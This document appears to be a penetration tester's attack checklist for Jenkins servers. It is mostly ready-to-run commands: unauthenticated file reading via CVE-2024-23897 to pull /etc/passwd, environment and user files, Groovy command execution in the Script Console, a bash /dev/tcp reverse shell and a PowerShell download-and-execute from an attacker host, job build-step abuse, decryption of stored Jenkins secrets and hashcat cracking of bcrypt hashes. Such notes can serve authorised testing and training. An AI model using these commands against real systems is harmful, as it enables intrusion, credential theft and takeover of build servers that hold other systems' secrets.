# Jenkins

## Is it, and which version
curl -skI <Scheme>://<WebHost>/ | grep -i x-jenkins
curl -sk -o /dev/null -w '%{http_code}\n' <Scheme>://<WebHost>/script
- [ ] The version from X-Jenkins through searchsploit
- [ ] Anonymous access to /script, /manage, /people or /asynchPeople/
- [ ] A login: admin:admin, admin:password, then every credential I hold

## No login: CVE-2024-23897
- [ ] Before 2.442, or LTS before 2.426.3: the CLI reads files from the server with no login
wget <Scheme>://<WebHost>/jnlpJars/jenkins-cli.jar
java -jar jenkins-cli.jar -s <Scheme>://<WebHost>/ -http connect-node '@/etc/passwd'
- [ ] Without read rights only a line or two comes back: /proc/self/environ for JENKINS_HOME, then its secrets
java -jar jenkins-cli.jar -s <Scheme>://<WebHost>/ -http connect-node '@/proc/self/environ'
java -jar jenkins-cli.jar -s <Scheme>://<WebHost>/ -http connect-node '@/var/jenkins_home/users/users.xml'
- [ ] users.xml names each user's folder: its config.xml holds the bcrypt hash

## Commands in the Script Console
At /script, or Manage Jenkins, Script Console, as Groovy:
println 'id'.execute().text
println 'cmd.exe /c whoami'.execute().text

## A shell from the console
rlwrap nc -lvnp <LPORT>
Linux:
['bash','-c','bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'].execute()
Windows, a script from Kali loaded into memory:
['powershell','-nop','-c','iex (iwr -UseBasicParsing http://<LHOST>/rev.ps1)'].execute()
- [ ] Other shells: :Pb shells
- [ ] With credentials, Metasploit does it too: exploit/multi/http/jenkins_script_console

## No console, but a job
- [ ] I can create or configure a job: a build step, Execute shell or Execute Windows batch command, with the shell line, then Build Now

## Stored credentials
- [ ] JENKINS_HOME, often /var/lib/jenkins or /var/jenkins_home: credentials.xml, jobs/*/config.xml, users/*/config.xml
grep -rhoE '<(password|passphrase|privateKey|secret|apiToken)>[^<]*' /var/lib/jenkins/credentials.xml /var/lib/jenkins/jobs/*/config.xml
Each {AQAAAB...} value decrypted in the Script Console:
println(hudson.util.Secret.decrypt('THE-SECRET'))
- [ ] A #jbcrypt: hash from a user's config.xml, with #jbcrypt: cut off, into hashes.txt
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
